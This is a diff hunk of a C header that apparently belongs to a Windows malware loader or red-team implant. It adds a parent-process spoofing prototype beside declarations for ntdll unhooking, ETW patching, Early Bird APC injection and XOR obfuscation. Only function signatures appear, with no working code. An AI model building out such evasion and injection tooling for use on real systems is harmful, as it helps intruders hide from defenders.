@@ -12,5 +12,6 @@ int FindTarget();
 void perunfart(HANDLE hSusProc);
 void etwPatch();
 void earlybird(PROCESS_INFORMATION pi);
+PROCESS_INFORMATION ppid(SIZE_T attributeSize, STARTUPINFOEX six);
 //HANDLE FindThread(int pid);
 void XOR(char* data, size_t data_len, char* key, size_t key_len);
